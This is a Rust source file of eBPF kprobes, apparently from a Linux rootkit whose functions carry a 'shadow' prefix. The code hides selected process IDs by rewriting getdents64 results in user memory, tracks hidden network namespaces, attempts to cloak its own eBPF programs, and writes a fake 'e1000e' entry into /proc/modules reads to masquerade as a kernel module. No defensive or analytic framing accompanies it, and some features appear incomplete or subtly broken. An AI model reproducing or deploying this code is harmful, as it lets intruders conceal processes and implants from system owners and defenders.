use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_read_user,
        bpf_probe_write_user,
    },
    macros::{kprobe, kretprobe},
    programs::{ProbeContext, RetProbeContext},
};
use common::{EventHeader, EVENT_BPF_CLOAKED, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN};

use crate::maps::*;
use crate::{FILE_F_INODE_OFFSET, INODE_I_INO_OFFSET};

// ──────────────────────────────────────────────
// FEATURE 1: Process Hiding (getdents64)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
    try_getdents64_enter(&ctx).unwrap_or_default()
}

fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    let buf_ptr: u64 = ctx.arg(1).ok_or(1i64)?;
    let tgid = bpf_get_current_pid_tgid();
    GETDENTS_BUFS.insert(&tgid, &buf_ptr, 0).map_err(|_| 2i64)?;
    Ok(0)
}

#[kretprobe]
pub fn shadow_getdents64_exit(ctx: RetProbeContext) -> u32 {
    try_getdents64_exit(&ctx).unwrap_or_default()
}

fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let tgid = bpf_get_current_pid_tgid();
    let buf_ptr = unsafe { GETDENTS_BUFS.get(&tgid).ok_or(1i64)? };
    let buf_ptr = *buf_ptr;
    let _ = GETDENTS_BUFS.remove(&tgid);

    let ret_val: i64 = ctx.ret().ok_or(2i64)?;
    if ret_val <= 0 {
        return Ok(0);
    }
    let total_bytes = ret_val as u64;

    let _probe_byte = match unsafe { bpf_probe_read_user(buf_ptr as *const u8) } {
        Ok(v) => v,
        Err(_) => return Ok(0),
    };

    let mut offset: u64 = 0;
    let mut prev_reclen_ptr: u64 = 0;
    let mut prev_reclen_val: u16 = 0;

    for _i in 0..128u32 {
        if offset >= total_bytes {
            break;
        }

        let entry_ptr = buf_ptr + offset;
        let reclen_ptr = entry_ptr + 16;
        let d_reclen: u16 = match unsafe { bpf_probe_read_user(reclen_ptr as *const u16) } {
            Ok(v) => v,
            Err(_) => break,
        };

        if d_reclen == 0 {
            break;
        }

        let name_ptr = entry_ptr + 19;
        let d_name: [u8; 16] = match unsafe { bpf_probe_read_user(name_ptr as *const [u8; 16]) } {
            Ok(v) => v,
            Err(_) => {
                offset += d_reclen as u64;
                continue;
            }
        };

        let pid = parse_pid_from_name(&d_name);

        if pid > 0 && unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
            if prev_reclen_ptr != 0 {
                let new_reclen = prev_reclen_val + d_reclen;
                unsafe {
                    let _ = bpf_probe_write_user(
                        prev_reclen_ptr as *mut u16,
                        &new_reclen as *const u16,
                    );
                }
                prev_reclen_val = new_reclen;
            } else {
                let dot_name: [u8; 2] = [b'.', 0];
                unsafe {
                    let _ = bpf_probe_write_user(
                        (entry_ptr + 19) as *mut [u8; 2],
                        &dot_name as *const [u8; 2],
                    );
                }
                prev_reclen_ptr = reclen_ptr;
                prev_reclen_val = d_reclen;
            }
            offset += d_reclen as u64;
            continue;
        }

        prev_reclen_ptr = reclen_ptr;
        prev_reclen_val = d_reclen;
        offset += d_reclen as u64;
    }

    Ok(0)
}

#[inline(always)]
fn parse_pid_from_name(name: &[u8; 16]) -> u32 {
    let mut pid: u32 = 0;
    let mut i = 0usize;
    while i < 16 {
        let c = name[i];
        if c == 0 {
            break;
        }
        if !c.is_ascii_digit() {
            return 0;
        }
        pid = pid * 10 + (c - b'0') as u32;
        i += 1;
    }
    pid
}

// ──────────────────────────────────────────────
// FEATURE 14: Network Namespace Hiding
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_setns_enter(ctx: ProbeContext) -> u32 {
    try_setns_enter(&ctx).unwrap_or_default()
}

fn try_setns_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let fd: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { HIDDEN_NETNS.get(&fd) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_NETNS_HIDDEN,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: fd,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 15: eBPF Program Cloaking
// ──────────────────────────────────────────────

const BPF_PROG_GET_NEXT_ID: u32 = 11;

#[kprobe]
pub fn shadow_bpf_enter(ctx: ProbeContext) -> u32 {
    try_bpf_enter(&ctx).unwrap_or_default()
}

fn try_bpf_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let cmd: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if cmd == BPF_PROG_GET_NEXT_ID {
        let pid_tgid = bpf_get_current_pid_tgid();
        let bpf_ctx = BpfCmdCtx { cmd, _pad: 0 };
        unsafe { BPF_CMD_ARGS.insert(&pid_tgid, &bpf_ctx, 0)? };
    }

    Ok(0)
}

#[kretprobe]
pub fn shadow_bpf_exit(ctx: RetProbeContext) -> u32 {
    try_bpf_exit(&ctx).unwrap_or_default()
}

fn try_bpf_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    if unsafe { BPF_CMD_ARGS.get(&pid_tgid) }.is_none() {
        return Ok(0);
    }
    unsafe { BPF_CMD_ARGS.remove(&pid_tgid)? };

    let ret: i64 = ctx.ret().ok_or(1i64)?;
    if ret < 0 {
        return Ok(0);
    }

    let next_id = pid;
    if unsafe { OWN_PROG_IDS.get(&next_id) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_BPF_CLOAKED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: next_id as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 16: Kernel Module Masquerading
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_modules_read_enter(ctx: ProbeContext) -> u32 {
    try_modules_read_enter(&ctx).unwrap_or_default()
}

fn try_modules_read_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let inode_ptr: u64 =
        unsafe { bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64)? };
    let ino: u64 =
        unsafe { bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64)? };

    let target_ino = unsafe { PROC_MODULES_INO.get(0) };
    if let Some(&modules_ino) = target_ino {
        if modules_ino != 0 && ino == modules_ino {
            let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
            let count: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };
            let vfs_ctx = VfsReadCtx {
                buf_ptr,
                inode: ino,
                count,
            };
            unsafe { VFS_READ_ARGS.insert(&pid_tgid, &vfs_ctx, 0)? };
        }
    }

    Ok(0)
}

#[kretprobe]
pub fn shadow_modules_read_exit(ctx: RetProbeContext) -> u32 {
    try_modules_read_exit(&ctx).unwrap_or_default()
}

fn try_modules_read_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    let target_ino = unsafe { PROC_MODULES_INO.get(0) };
    if let Some(&modules_ino) = target_ino {
        if args.inode != modules_ino {
            return Ok(0);
        }
    } else {
        return Ok(0);
    }

    unsafe { VFS_READ_ARGS.remove(&pid_tgid)? };

    let ret: i64 = ctx.ret().ok_or(1i64)?;
    if ret <= 0 {
        return Ok(0);
    }

    let fake_line: [u8; 48] = *b"e1000e 286720 0 - Live 0xffffffffc0400000\n\0\0\0\0\0\0";
    let write_offset = if (ret as u64) < args.count - 48 {
        ret as u64
    } else {
        return Ok(0);
    };

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.buf_ptr + write_offset) as *mut core::ffi::c_void,
            fake_line.as_ptr() as *const core::ffi::c_void,
            48,
        );
    }

    let event = EventHeader {
        event_type: EVENT_MODULE_MASQUERADE,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: args.inode,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}
